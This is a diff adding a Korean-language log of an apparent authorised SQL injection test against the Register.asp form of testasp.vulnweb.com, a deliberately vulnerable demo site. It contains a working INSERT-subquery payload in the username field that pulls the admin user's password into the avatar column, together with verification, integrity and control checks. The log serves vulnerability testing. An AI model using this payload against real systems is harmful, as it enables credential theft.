@@ -1,0 +1,32 @@
+### 1. 사전 상태 (읽기 전용)
+  사전 users 에 rt12x 존재?      False   (False 기대)
+  사전 users 에 RT12TEST 존재?   False   (False 기대)
+  Default.asp 포럼 카운트 마커=0 / 스레드9 게시글=0
+
+### 2. 기준선 — 정상 회원가입 1건 (쓰기 #1)
+  POST /Register.asp  → 200 redirect=http://testasp.vulnweb.com/Login.asp?RetURL=
+  오라클: users 에 RT12TEST 실존? True   (True 기대)
+
+### 3. 주입 — tfUName 으로 서브쿼리를 INSERT 값 목록에 삽입 (쓰기 #2)
+  payload tfUName = rt12x', 'p', 'e', 'r', (SELECT TOP 1 upass FROM users WHERE uname='admin'))--
+  POST /Register.asp  → 200 redirect=http://testasp.vulnweb.com/Login.asp?RetURL=
+
+### 4. 교차검증 (읽기 전용 오라클)
+  주입 행 rt12x 실존?                          True   (True ⇒ INSERT 성공)
+  avatar 가 서브쿼리 결과와 동일?              True   (True ⇒ ★ 값 목록 안에서 서브쿼리가 실행됨)
+  email='e' (지정값 그대로)?                   True
+  realname='r' (지정값 그대로)?                True
+  주입 행이 정확히 1건?                        True
+  ★ avatar 값(쓰기→읽기 체인) = 'none'
+
+### 5. 기존 데이터 무결성 (쓰기 전후 비교)
+  Default.asp 마커 0 → 0
+  스레드9 게시글  0 → 0
+  게시글 총수 오라클 25 초과? False  (False 기대 — 삭제 없음)
+
+### 6. 대조 — 같은 이름을 페이로드 없이 등록하면?
+  POST(정상값) → 200
+  대조 행 rt12ctrl 실존? True
+  대조 행 avatar 는 빈 문자열? True   (True ⇒ 'avatar=빈 값' 이 정상 형태이고, 주입 행만 값이 들어감)
+
+### 완료 — 총 요청 54건 (쓰기 3건: 기준선·주입·대조) → out/register_sqli.json
